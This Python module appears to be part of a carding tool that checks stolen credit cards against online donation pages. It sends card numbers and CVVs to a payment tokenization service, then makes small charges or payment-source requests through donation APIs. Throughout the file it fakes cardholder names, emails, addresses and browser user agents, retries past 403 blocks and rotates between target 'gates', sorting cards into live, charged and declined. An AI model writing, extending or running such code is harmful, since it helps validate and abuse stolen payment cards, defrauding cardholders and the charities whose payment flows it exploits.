import time
import requests
import json
import random
import string
import logging
import threading

# Import the central gate configurations
from gate_configurations import GATE_CONFIGS

logger = logging.getLogger(__name__)

# --- STATE MANAGEMENT FOR BANNED GATES (THREAD-SAFE) ---
# This will store the names of gates that have failed repeatedly.
_banned_gates = set()
_ban_lock = threading.Lock()

def get_banned_gates():
    """Returns a copy of the currently banned gates."""
    with _ban_lock:
        return _banned_gates.copy()

def ban_gate(gate_name):
    """Adds a gate to the banned list."""
    with _ban_lock:
        _banned_gates.add(gate_name)
    logger.warning(f"Gate '{gate_name}' has been temporarily banned due to repeated failures.")

def unban_all_gates():
    """Clears the banned gates list."""
    with _ban_lock:
        if _banned_gates:
            logger.info(f"All banned gates have been reloaded: {_banned_gates}")
            _banned_gates.clear()

# --- UTILITY FUNCTIONS (COPIED FROM main.py for consistency) ---

def generate_random_string(length=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def random_email(config):
    """Creates a random email based on the gate's configuration."""
    min_len, max_len = config['text_length_range']
    num_digits = config['append_digits']
    
    text_part = ''.join(random.choices(string.ascii_lowercase, k=random.randint(min_len, max_len)))
    number_part = ''
    if num_digits > 0:
        number_part = ''.join(random.choices(string.digits, k=num_digits))
        
    prefix = f"{text_part}{number_part}"
    domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    return f"{prefix}@{domain}.com"

def random_user_agent():
    chrome_major = random.randint(100, 138)
    chrome_build = random.randint(0, 6500)
    chrome_patch = random.randint(0, 250)
    webkit_major = random.randint(537, 605)
    webkit_minor = random.randint(36, 99)
    safari_version = f"{webkit_major}.{webkit_minor}"
    chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
    win_version = "10.0; Win64; x64"
    return (f"Mozilla/5.0 (Windows NT {win_version}) "
            f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
            f"Chrome/{chrome_version} Safari/{safari_version}")

def make_request_with_special_retry(session, method, url, gate_name, max_retries=10, cancellation_event=None, **kwargs):
    """
    Custom retry function for Multi-Gate mode.
    Retries on specific errors and can lead to banning a gate.
    """
    last_exception = None
    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user", False # Not a ban-worthy failure

        try:
            response = session.request(method, url, **kwargs)
            # A 403 Forbidden is a specific failure case we want to retry
            if response.status_code == 403:
                last_exception = requests.exceptions.HTTPError(f"403 Forbidden on attempt {attempt + 1}")
                wait_time = attempt + 1
                logger.warning(f"Gate '{gate_name}' returned 403. Attempt {attempt + 1}/{max_retries}. Retrying in {wait_time}s...")
                time.sleep(wait_time)
                continue
            
            # Any other successful or client-error response is returned immediately
            return response, None, False

        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Request for gate '{gate_name}' failed: {e}. Attempt {attempt + 1}/{max_retries}. Retrying in {wait_time}s...")
            time.sleep(wait_time)

    # If all retries fail, we signal that the gate should be banned
    final_error_message = f"All {max_retries} retry attempts for gate '{gate_name}' failed. Last error: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message, True # True indicates a ban-worthy failure

# --- MAIN CHECKER LOGIC ---

def _check_card_generic(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, mode, charge_value, gate_name, gate_config):
    """Internal function to check a card against a specific gate configuration."""
    try:
        # --- Generate random data based on gate config ---
        user_agent = random_user_agent()
        min_name, max_name = gate_config['name_length_range']
        first_name = generate_random_string(random.randint(min_name, max_name))
        last_name = generate_random_string(random.randint(min_name, max_name))
        cardholder = f"{first_name} {last_name}"
        email = random_email(gate_config['email_config'])
        
        street = generate_random_string(random.randint(20, 35))
        house_number = generate_random_string(random.randint(20, 35))
        postal_code = ''.join(random.choices(string.digits, k=5))
        city = generate_random_string(random.randint(20, 35))
        random_message = generate_random_string(random.randint(20, 35))

        # --- Step 1: Get Token for the card ---
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Host": "pay.datatrans.com", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField", "User-Agent": user_agent, "X-Requested-With": "XMLHttpRequest" }
        tokenize_payload = { "mode": "TOKENIZE", "formId": gate_config['formId'], "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": user_agent, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }

        token_response, error, should_ban = make_request_with_special_retry(session, 'post', tokenize_url, gate_name, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if should_ban:
            ban_gate(gate_name)
            return 'error', line, f"[{gate_name}] Banned after Tokenize Error: {error}", bin_info
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"[{gate_name}] Tokenize Error: {error}", bin_info
        
        if "Card number not allowed in production" in token_response.text: return 'decline', line, f'[{gate_name}] INVALID_CARDNUMBER_DECLINE', bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and "message" in token_data.get("error", {}): return 'decline', line, f'[{gate_name}] {token_data["error"]["message"]}', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id: return 'decline', line, f'[{gate_name}] {token_data.get("error", "Unknown error at Tokenize")}', bin_info
        except json.JSONDecodeError:
            return 'error', line, f"[{gate_name}] Tokenize response was not JSON: {token_response.text}", bin_info

        # --- Step 2: Perform payment/source request ---
        payment_headers = { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": user_agent }
        
        payload_str = json.dumps(gate_config['payload'])
        replacements = {
            "{{first_name}}": first_name, "{{last_name}}": last_name, "{{cardholder}}": cardholder,
            "{{email}}": email, "{{user_agent}}": user_agent, "{{expiry_month}}": mes.zfill(2),
            "{{expiry_year}}": ano, "{{transaction_id}}": transaction_id, "{{street}}": street,
            "{{house_number}}": house_number, "{{postal_code}}": postal_code, "{{city}}": city,
            "{{message}}": random_message
        }
        for placeholder, value in replacements.items():
            payload_str = payload_str.replace(placeholder, value)
        
        base_payload = json.loads(payload_str)

        if mode == 'charge':
            payment_url = "https://api.raisenow.io/payments"
            payment_payload = base_payload
            payment_payload["amount"] = {"currency": gate_config['currency'], "value": charge_value}
        else: # 'live' mode
            payment_url = "https://api.raisenow.io/payment-sources"
            payment_payload = base_payload
            payment_payload["amount"] = {"currency": gate_config['currency'], "value": 50} 

        payment_response, error, should_ban = make_request_with_special_retry(session, 'post', payment_url, gate_name, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if should_ban:
            ban_gate(gate_name)
            return 'error', line, f"[{gate_name}] Banned after Payment Error: {error}", bin_info
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"[{gate_name}] Payment Error: {error}", bin_info

        response_text = payment_response.text
        if '"payment_status":"succeeded"' in response_text:
            return 'success', line, f'[{gate_name}] CHARGED_{charge_value/100:.2f}{gate_config["currency"]}', bin_info
        elif '"payment_source_status":"pending"' in response_text:
            return 'live_success', line, f'[{gate_name}] LIVE_SUCCESS', bin_info
        elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text:
            return 'decline', line, f'[{gate_name}] DECLINED', bin_info
        elif '"action":{"action_type":"redirect"' in response_text or '"3d_secure_2"' in response_text:
            return 'custom', line, f'[{gate_name}] 3D_SECURE', bin_info
        else:
            return 'unknown', line, f'[{gate_name}] UNKNOWN_RESPONSE: {response_text}', bin_info

    except Exception as e:
        logger.error(f"Unknown error in Generic Checker for gate '{gate_name}' on line '{line}': {e}", exc_info=True)
        return 'error', line, f"[{gate_name}] System Error: {e}", bin_info

def check_card_multi_gate(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_mode_func, custom_charge_amount=None):
    """
    Main function for Multi-Gate mode. It randomly selects an available (non-banned) gate and runs the check.
    """
    try:
        all_gates = list(GATE_CONFIGS.keys())
        banned_gates = get_banned_gates()
        available_gates = [g for g in all_gates if g not in banned_gates]
        
        if not available_gates:
            logger.warning("All multi-gates are currently banned. Reloading the list.")
            unban_all_gates()
            available_gates = all_gates
            if not available_gates:
                 return 'error', line, "No gates defined in gate_configurations.py", bin_info

        random_gate_name = random.choice(available_gates)
        gate_config = GATE_CONFIGS[random_gate_name]
        
        mode = get_mode_func() 
        charge_value = custom_charge_amount if custom_charge_amount is not None else 50 # Default charge 0.50
        
        logger.info(f"Running card on Multi-Gate mode, randomly selected: {random_gate_name}")
        
        return _check_card_generic(
            session, line, cc, mes, ano, cvv, bin_info, cancellation_event, 
            mode, charge_value, random_gate_name, gate_config
        )
    except Exception as e:
        logger.error(f"Error in Multi-Gate selection process for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Multi-Gate Main Error: {e}", bin_info
